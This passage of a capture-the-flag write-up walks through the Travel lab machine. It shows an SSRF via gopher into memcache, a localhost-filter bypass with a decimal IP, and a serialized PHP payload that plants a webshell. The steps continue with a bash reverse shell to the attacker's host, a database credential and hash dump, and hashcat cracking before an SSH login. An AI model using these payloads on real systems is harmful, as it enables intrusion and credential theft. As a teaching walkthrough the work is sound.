+    <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">cache</span><span class="o">-&gt;</span><span class="nf">addServer</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">[</span><span class="s1">'host'</span><span class="p">],</span> <span class="p">(</span><span class="n">int</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">options</span><span class="p">[</span><span class="s1">'port'</span><span class="p">]);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>It sets some default values, and merges them with what’s passed in via the location parameter. And then comes what I’m looking for. <code class="language-plaintext highlighter-rouge">$this-&gt;name</code> is set to the prefix (<code class="language-plaintext highlighter-rouge">xct_</code>) concatenated with <code class="language-plaintext highlighter-rouge">md5("$name:$type")</code>. <code class="language-plaintext highlighter-rouge">$name</code> is already the <code class="language-plaintext highlighter-rouge">md5($url)</code>, and <code class="language-plaintext highlighter-rouge">$type</code> is <code class="language-plaintext highlighter-rouge">spc</code>. So the cached name is <code class="language-plaintext highlighter-rouge">md5(md5($url) . ":spc")</code>.</p>
+<h4 id="testing">Testing</h4>
+<p>I can test this. The default url is <code class="language-plaintext highlighter-rouge">http://www.travel.htb/newsfeed/customfeed.xml</code>. If I apply that calculation here, I get:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'http://www.travel.htb/newsfeed/customfeed.xml'</span> | <span class="nb">md5sum</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f1</span><span class="si">)</span><span class="s2">:spc"</span> | <span class="nb">md5sum</span>
+<span class="go">4e5612ba079c530a6b1f148c0b352241  -
+</span></code></pre></div></div>
+<p>If I <code class="language-plaintext highlighter-rouge">curl</code> the awesome-rss site, the first time there’s no data in the cache. But the second, I see the cache, and it starts with <code class="language-plaintext highlighter-rouge">xct_4e5612ba07</code>, which matches above:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="s1">'http://blog.travel.htb/awesome-rss/?debug'</span> | <span class="nb">grep </span>xct
+<span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="s1">'http://blog.travel.htb/awesome-rss/?debug'</span> | <span class="nb">grep </span>xct
+<span class="go">| xct_4e5612ba07(...) | a:4:{s:5:"child";a:1:{s:0:"";a:1:{(...) |
+</span></code></pre></div></div>
+<p>If I host a copy of that file on my VM, and then request it, then both show up in the cache:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'http://10.10.14.47/customfeed.xml'</span> | <span class="nb">md5sum</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f1</span><span class="si">)</span><span class="s2">:spc"</span> | <span class="nb">md5sum</span>
+<span class="go">33b3801533e6b205005605117e9b685d  -
+</span><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="s1">'http://blog.travel.htb/awesome-rss/?debug'</span> | <span class="nb">grep </span>xct
+<span class="go">| xct_33b3801533(...) | a:4:{s:5:"child";a:1:{s:0:"";a:1:{(...) |
+| xct_4e5612ba07(...) | a:4:{s:5:"child";a:1:{s:0:"";a:1:{(...) |
+</span></code></pre></div></div>
+<h3 id="interaction-with-memcache">Interaction with memcache</h3>
+<h4 id="gopher">Gopher</h4>
+<p>Since my attack is poisoning the cache in memcache with a PHP serialized object, I need a way to talk directly to memcache. It’s not listening on a port I can talk to. It’s likely listening only on localhost. I’ve already shown that I can send a url through the website that will be passed to curl. This is where a neat trick comes in that uses <a href="https://en.wikipedia.org/wiki/Gopher_(protocol)">Gopher</a>. Gopher was an early competitor to HTTP, but has faded into obscurity.</p>
+<p>What makes it useful here is that it doesn’t send a bunch of headers like HTTP. If I just curl into port 11211, all the junk like <code class="language-plaintext highlighter-rouge">Host: 127.0.0.1</code> and <code class="language-plaintext highlighter-rouge">User-Agent: curl</code> are going to fail as memcache commands and ruin the connection. Gopher is clean, and it can do multiple line input from what in HTTP would be a GET. For example, I’ll start a <code class="language-plaintext highlighter-rouge">nc</code> listener, and hit it with HTTP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="s1">'http://127.0.0.1:9001/_test%0a%0dline%202'</span>
+</code></pre></div></div>
+<p>The result is:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nc <span class="nt">-lnp</span> 9001
+<span class="go">GET /_test%0a%0dline%202 HTTP/1.1
+Host: 127.0.0.1:9001
+User-Agent: curl/7.68.0
+Accept: */*
+
+</span></code></pre></div></div>
+<p>If I do the same thing, but this time with Gopher:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="s1">'gopher://127.0.0.1:9001/_test%0a%0dline%202'</span>
+</code></pre></div></div>
+<p>The result is just the stuff after the <code class="language-plaintext highlighter-rouge">/_</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nc <span class="nt">-lnp</span> 9001
+<span class="go">test
+line 2
+</span></code></pre></div></div>
+<p>Some googling found several writeups using Gopher to exploit things like <a href="https://hackerone.com/reports/115748">smtp</a> and <a href="https://maxchadwick.xyz/blog/ssrf-exploits-against-redis">redis</a>.</p>
+<h4 id="gopherus">Gopherus</h4>
+<p>One of the things that got me going down this path entirely was in googling for “memcache SSRF”, I found <a href="https://github.com/tarunkant/Gopherus">Gopherus</a>. This is a package that will help generate SSRF Gopher links for all sorts of different services, from mysql to redis to memcache in Python, Ruby, or PHP.</p>
+<p>I cloned it into <code class="language-plaintext highlighter-rouge">/opt</code>, and ran <code class="language-plaintext highlighter-rouge">install.sh</code> which downloads the required libraries, makes <code class="language-plaintext highlighter-rouge">gopherus.py</code> executable, and installs a symlink into <code class="language-plaintext highlighter-rouge">/usr/local/bin</code>. Now it runs:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>gopherus 
+<span class="go">
+
+  ________              .__
+ /  _____/  ____ ______ |  |__   ___________ __ __  ______
+/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
+\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \
+ \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;
+        \/       |__|        \/     \/                 \/
+
+                author: $_SpyD3r_$
+
+usage: gopherus [-h] [--exploit EXPLOIT]
+
+optional arguments:
+  -h, --help         show this help message and exit
+  --exploit EXPLOIT  mysql, fastcgi, redis, smtp, zabbix, pymemcache,
+                     rbmemcache, phpmemcache, dmpmemcache
+None
+</span></code></pre></div></div>
+<p>I’ll run it with <code class="language-plaintext highlighter-rouge">--exploit phpmemcache</code> and give it a test payload:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>gopherus <span class="nt">--exploit</span> phpmemcache
+<span class="go">
+
+  ________              .__
+ /  _____/  ____ ______ |  |__   ___________ __ __  ______
+/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
+\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \
+ \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;
+        \/       |__|        \/     \/                 \/
+
+                author: $_SpyD3r_$
+
+
+This is usable when you know Class and Variable name used by user
+
+Give serialization payload
+example: O:5:"Hello":0:{}   : test payload
+
+Your gopher link is ready to do SSRF : 
+
+gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%2012%0d%0atest%20payload%0d%0a
+
+After everything done, you can delete memcached item by using this payload: 
+
+gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a
+
+-----------Made-by-SpyD3r-----------
+</span></code></pre></div></div>
+<p>What comes out looks just like what I played with above. If I decode what comes after <code class="language-plaintext highlighter-rouge">/_</code>, its:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set SpyD3r 4 0 12
+test payload
+</code></pre></div></div>
+<p>That’s memcache to set a key “SpyD3r” with metadata of 4, expiry time of 0, and length of payload 12. Then the next line puts in those twelve bytes, ending with <code class="language-plaintext highlighter-rouge">\r\n</code>.</p>
+<h3 id="bypass-hacker-checks">Bypass Hacker Checks</h3>
+<p>I tried to submit the payload out of Gopherus using:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="s1">'http://blog.travel.htb/awesome-rss/?custom_feed_url&amp;url=gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%2012%0d%0atest%20payload%0d%0a'</span>
+</code></pre></div></div>
+<p>Because I was lazily grepping for <code class="language-plaintext highlighter-rouge">^|</code> to get the debug output, it took me a few minutes to figure out why I was getting none. I eventually paste it into Firefox:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200521071602174.webp" type="image/webp"/>
+<img alt="image-20200521071602174" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200521071602174.png"/>
+</picture>
+<p>In <code class="language-plaintext highlighter-rouge">template.php</code>, this check is matching:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$tmp</span> <span class="o">=</span> <span class="nb">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="kc">PHP_URL_HOST</span><span class="p">);</span>
+<span class="c1">// preventing all localhost access</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$tmp</span> <span class="o">==</span> <span class="s2">"localhost"</span> <span class="k">or</span> <span class="nv">$tmp</span> <span class="o">==</span> <span class="s2">"127.0.0.1"</span><span class="p">)</span>
+<span class="p">{</span>               
+        <span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h2&gt;Hacking attempt prevented (Internal SSRF). Event has been logged.&lt;/h2&gt;"</span><span class="p">);</span>              
+<span class="p">}</span>
+</code></pre></div></div>
+<p>At first I tried a few things that I found in <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">this Blackhat presentation by Orange Tsai</a> (that guy seems to turn up everywhere), but couldn’t get any to work. The I remembered a Tweet that went round a couple months ago (I couldn’t find it again) showing how IP addresses in URLs can be put in a lot of different ways. PayloadsAllTheThings has a <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypassing-filters">page for this</a>. It seems like the decimal IP would work here, so I replaced <code class="language-plaintext highlighter-rouge">127.0.0.1</code>  with <code class="language-plaintext highlighter-rouge">2130706433</code>.</p>
+<p>Now I can run that curl, and there’s no Hacking message. Even with <code class="language-plaintext highlighter-rouge">debug</code> in the message, it doesn’t print the debug info, likely because the weird url doesn’t load a feed. But if immediately after I run the default url with <code class="language-plaintext highlighter-rouge">debug</code>, I can see I’ve put data into memcache:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="s1">'http://blog.travel.htb/awesome-rss/?custom_feed_url&amp;url=gopher://2130706433:11211/_%0d%0aset%20SpyD3r%204%200%2012%0d%0atest%20payload%0d%0a'</span> | <span class="nb">grep</span> <span class="s1">'Hacking'</span>
+<span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="s1">'http://blog.travel.htb/awesome-rss/?debug'</span> | <span class="nb">grep</span> <span class="s1">'^| '</span>
+<span class="go">| SpyD3r | test payload |
+</span></code></pre></div></div>
+<h3 id="weaponize-payload">Weaponize Payload</h3>
+<p>There’s two changes I need to make here to get my payload working. First, I need to target a memcache name to something I can legitimately trigger later. I could have it use the default feed location, but I’d prefer to make it one others won’t stomp on. I <a href="#weaponize-payload">showed earlier</a> that the url <code class="language-plaintext highlighter-rouge">http://10.10.14.47/customfeed.xml</code> resulted in a memcache location of <code class="language-plaintext highlighter-rouge">xct_33b3801533e6b205005605117e9b685d</code>, so I’ll use that. In the <code class="language-plaintext highlighter-rouge">curl</code> above, I’ll replace <code class="language-plaintext highlighter-rouge">SpyD3r</code>and it works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="s1">'http://blog.travel.htb/awesome-rss/?custom_feed_url&amp;url=gopher://2130706433:11211/_%0d%0aset%20xct_33b3801533e6b205005605117e9b685d%204%200%2012%0d%0atest%20payload%0d%0a'</span> | <span class="nb">grep</span> <span class="s1">'Hacking'</span>
+<span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="s1">'http://blog.travel.htb/awesome-rss/?debug'</span> | <span class="nb">grep</span> <span class="s1">'^| '</span>
+<span class="go">| xct_33b3801533(...) | test payload |
+</span></code></pre></div></div>
+<p>Next I’ll replace “test payload” with the payload I <a href="#weaponize-payload">created earlier</a>. I could do this manually, by encoding the payload, getting the length, and putting both of those into the right places, but there’s too much room for error. So I used <code class="language-plaintext highlighter-rouge">gopherus</code> again with the new payload, and remembered to change 127.0.0.1 to 2130706433 and the name to get the following url:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gopher://2130706433:11211/_%0d%0aset%20xct_33b3801533e6b205005605117e9b685d%204%200%20101%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:8:%220xdf.php%22%3Bs:4:%22data%22%3Bs:30:%22%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
+</code></pre></div></div>
+<h3 id="execute">Execute</h3>
+<h4 id="upload">Upload</h4>
+<p>I’ll <code class="language-plaintext highlighter-rouge">curl</code> to poison memcache, and it works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="s1">'http://blog.travel.htb/awesome-rss/?custom_feed_url&amp;url=gopher://2130706433:11211/_%0d%0aset%20xct_33b3801533e6b205005605117e9b685d%204%200%20101%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:8:%220xdf.php%22%3Bs:4:%22data%22%3Bs:30:%22%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a'</span> | <span class="nb">grep</span> <span class="s1">'Hacking'</span>
+<span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="s1">'http://blog.travel.htb/awesome-rss/?debug'</span> | <span class="nb">grep</span> <span class="s1">'^| '</span>
+<span class="go">| xct_33b3801533(...) | O:14:"TemplateHelper":2:{s:4:"file(...) |
+</span></code></pre></div></div>
+<p>Now to trigger it, I need to get SimplePie to try to access the url associated with that key. So I’ll request it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="s1">'http://blog.travel.htb/awesome-rss/?custom_feed_url&amp;url=http://10.10.14.47/customfeed.xml'</span> <span class="o">&gt;</span> /dev/null
+</code></pre></div></div>
+<p>If things worked, the webshell should be written.</p>
+<h4 id="find-webshell">Find Webshell</h4>
+<p>The PHP writes the file to <code class="language-plaintext highlighter-rouge">__DIR__.'/logs/'.$this-&gt;file</code>. The install instructions included the line “copy rss_template.php &amp; template.php to <code class="language-plaintext highlighter-rouge">wp-content/themes/twentytwenty</code>”. So the logs directory should be at <code class="language-plaintext highlighter-rouge">http://blog.travel.htb/wp-content/themes/twentytwenty/logs/</code>. Visiting gives a 403, which is a good sign it’s there:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200521082904254.webp" type="image/webp"/>
+<img alt="image-20200521082904254" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200521082904254.png"/>
+</picture>
+<p>If I go to <code class="language-plaintext highlighter-rouge">0xdf.php?cmd=id</code>, I’ve got RCE:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-s</span> http://blog.travel.htb/wp-content/themes/twentytwenty/logs/0xdf.php?cmd<span class="o">=</span><span class="nb">id</span>
+<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></code></pre></div></div>
+<h4 id="shell">Shell</h4>
+<p>To get a shell, I’ll hit the shell with <code class="language-plaintext highlighter-rouge">curl</code> and a reverse shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-G</span> <span class="s1">'http://blog.travel.htb/wp-content/themes/twentytwenty/logs/0xdf.php'</span> <span class="nt">--data-urlencode</span> <span class="s2">"cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.47/443 0&gt;&amp;1'"</span>
+</code></pre></div></div>
+<p>In a listening <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.189.
+Ncat: Connection from 10.10.10.189:34800.
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">www-data@blog:/var/www/html/wp-content/themes/twentytwenty/logs$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></code></pre></div></div>
+<h2 id="shell-as-lynik-admintravel">Shell as lynik-admin@travel</h2>
+<h3 id="enumeration">Enumeration</h3>
+<p>The host I landed is in clearly a container:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@blog:/$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span> .dockerenv 
+<span class="go">-rwxr-xr-x 1 root root 0 Apr 23 18:44 .dockerenv
+</span><span class="gp">www-data@blog:/$</span><span class="w"> </span><span class="nb">hostname</span> 
+<span class="go">blog
+</span><span class="gp">www-data@blog:/$</span><span class="w"> </span>ip addr
+<span class="go">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+16: eth0@if17: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:ac:1e:00:0a brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 172.30.0.10/24 brd 172.30.0.255 scope global eth0
+       valid_lft forever preferred_lft forever
+</span></code></pre></div></div>
+<p>It has no interactive users other than root. It is listening on 80 (the website), and memcache, mysql, and something unknown are listening on localhost:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@blog:/$</span><span class="w"> </span>netstat <span class="nt">-tnlp</span>
+<span class="go">(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.11:41153        0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -  
+</span></code></pre></div></div>
+<p>The DB connection info is in <code class="language-plaintext highlighter-rouge">/var/www/html/wp-config.php</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mf">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="mf">...</span>
+<span class="c1">// ** MySQL settings - You can get this info from your web host ** // </span>
+<span class="cd">/** The name of the database for WordPress */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_NAME'</span><span class="p">,</span> <span class="s1">'wp'</span> <span class="p">);</span>  
+
+<span class="cd">/** MySQL database username */</span>                   
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_USER'</span><span class="p">,</span> <span class="s1">'wp'</span> <span class="p">);</span>
+                                                                   
+<span class="cd">/** MySQL database password */</span> 
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_PASSWORD'</span><span class="p">,</span> <span class="s1">'fiFtDDV9LYe8Ti'</span> <span class="p">);</span> 
+                                                                   
+<span class="cd">/** MySQL hostname */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_HOST'</span><span class="p">,</span> <span class="s1">'127.0.0.1'</span> <span class="p">);</span>
+<span class="mf">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="mf">...</span>
+</code></pre></div></div>
+<p>In the database I’ll dump both the WordPress hashes and the MySQL hashes:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@blog:/$ </span><span class="n">mysql</span> <span class="o">-</span><span class="n">u</span> <span class="n">wp</span> <span class="o">-</span><span class="n">pfiFtDDV9LYe8Ti</span> <span class="n">wp</span>   
+<span class="go">Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 30493
+Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+</span><span class="gp">MariaDB [wp]&gt;</span><span class="w"> </span><span class="k">show</span> <span class="n">tables</span><span class="p">;</span>
+<span class="go">+-----------------------+
+| Tables_in_wp          |
++-----------------------+
+| wp_commentmeta        |
+| wp_comments           |
+| wp_links              |
+| wp_options            |
+| wp_postmeta           |
+| wp_posts              |
+| wp_term_relationships |
+| wp_term_taxonomy      |
+| wp_termmeta           |
+| wp_terms              |
+| wp_usermeta           |
+| wp_users              |
++-----------------------+
+12 rows in set (0.000 sec)
+
+</span><span class="gp">MariaDB [wp]&gt;</span><span class="w"> </span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">wp_users</span><span class="p">;</span>
+<span class="go">+----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+
+| ID | user_login | user_pass                          | user_nicename | user_email       | user_url         | user_registered     | user_activation_key | user_status | display_name |
++----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+
+|  1 | admin      | $P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/ | admin         | admin@travel.htb | http://localhost | 2020-04-13 13:19:01 |                     |           0 | admin        |
++----+------------+------------------------------------+---------------+------------------+------------------+---------------------+---------------------+-------------+--------------+
+1 row in set (0.000 sec)
+</span><span class="gp">MariaDB [wp]&gt;</span><span class="w"> </span><span class="n">use</span> <span class="n">mysql</span>
+<span class="go">Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+Database changed
+</span><span class="gp">MariaDB [mysql]&gt;</span><span class="w"> </span><span class="k">select</span> <span class="k">host</span><span class="p">,</span><span class="k">user</span><span class="p">,</span><span class="n">password</span> <span class="k">from</span> <span class="k">user</span><span class="p">;</span>
+<span class="go">+-----------+------+-------------------------------------------+
+| host      | user | password                                  |
++-----------+------+-------------------------------------------+
+| localhost | root | *1B60CF2952D5498B80A1FCB3E6DACA506461CCED |
+| localhost | wp   | *78FC42823E305392882F5BAAF99BB381F989010C |
++-----------+------+-------------------------------------------+
+2 rows in set (0.000 sec)
+</span></code></pre></div></div>
+<p>I tossed all three of those into <code class="language-plaintext highlighter-rouge">hashcat</code>, but none broke on rockyou. However, there’s a backup of the database in <code class="language-plaintext highlighter-rouge">/opt/wordpress</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@blog:/opt/wordpress$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">backup-13-04-2020.sql
+</span></code></pre></div></div>
+<p>At the very bottom, there’s the data for the <code class="language-plaintext highlighter-rouge">wp.users</code> table:</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">LOCK</span> <span class="n">TABLES</span> <span class="nv">`wp_users`</span> <span class="k">WRITE</span><span class="p">;</span>
+<span class="cm">/*!40000 ALTER TABLE `wp_users` DISABLE KEYS */</span><span class="p">;</span>
+<span class="k">INSERT</span> <span class="k">INTO</span> <span class="nv">`wp_users`</span> <span class="k">VALUES</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s1">'admin'</span><span class="p">,</span><span class="s1">'$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/'</span><span class="p">,</span><span class="s1">'admin'</span><span class="p">,</span><span class="s1">'admin@travel.htb'</span><span class="p">,</span><span class="s1">'http://localhost'</span><span class="p">,</span><span class="s1">'2020-04-13 13:19:01'</span><span class="p">,</span><span class="s1">''</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s1">'admin'</span><span class="p">),(</span><span class="mi">2</span><span class="p">,</span><span class="s1">'lynik-admin'</span><span class="p">,</span><span class="s1">'$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.'</span><span class="p">,</span><span class="s1">'lynik-admin'</span><span class="p">,</span><span class="s1">'lynik@travel.htb'</span><span class="p">,</span><span class="s1">''</span><span class="p">,</span><span class="s1">'2020-04-13 13:36:18'</span><span class="p">,</span><span class="s1">''</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s1">'Lynik Schmidt'</span><span class="p">);</span>
+<span class="cm">/*!40000 ALTER TABLE `wp_users` ENABLE KEYS */</span><span class="p">;</span>
+<span class="n">UNLOCK</span> <span class="n">TABLES</span><span class="p">;</span>
+<span class="cm">/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */</span><span class="p">;</span>
+
+<span class="cm">/*!40101 SET SQL_MODE=@OLD_SQL_MODE */</span><span class="p">;</span>
+<span class="cm">/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */</span><span class="p">;</span>
+<span class="cm">/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */</span><span class="p">;</span>
+<span class="cm">/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */</span><span class="p">;</span>
+<span class="cm">/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */</span><span class="p">;</span>
+<span class="cm">/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */</span><span class="p">;</span>
+<span class="cm">/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */</span><span class="p">;</span>
+</code></pre></div></div>
+<p>There’s a second user in there for a user, lynik-admin!</p>
+<h3 id="crack-hash">Crack Hash</h3>
+<p>With that in a file, I’ll start <code class="language-plaintext highlighter-rouge">hashcat</code> again, and the one from the backup cracks:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>hashcat <span class="nt">-m</span> 400 wp_hashes /usr/share/wordlists/rockyou.txt <span class="nt">--force</span>
+<span class="go">...[snip]...
+$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.:1stepcloser   
+...[snip]...
+</span></code></pre></div></div>
+<h3 id="ssh">SSH</h3>
+<p>After trying to <code class="language-plaintext highlighter-rouge">su</code> to root in the container and failing, I tried the username and password over SSH, and got a shell on Travel:</p>
+<div class="language-console sshpass-disclaimer highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>sshpass <span class="nt">-p</span> 1stepcloser ssh lynik-admin@10.10.10.189
+<span class="go">Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)
+
+  System information as of Thu 21 May 2020 08:50:09 PM UTC
+
+  System load:                      0.0
+  Usage of /:                       46.1% of 15.68GB
+  Memory usage:                     16%
+  Swap usage:                       0%
+  Processes:                        214
+  Users logged in:                  0
+  IPv4 address for br-836575a2ebbb: 172.20.0.1
+  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.10.189
+
+Last login: Thu May 21 20:36:20 2020 from 10.10.14.47
+</span><span class="gp">lynik-admin@travel:~$</span><span class="w">
+</span></code></pre></div></div>
+<p>From there, I had <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
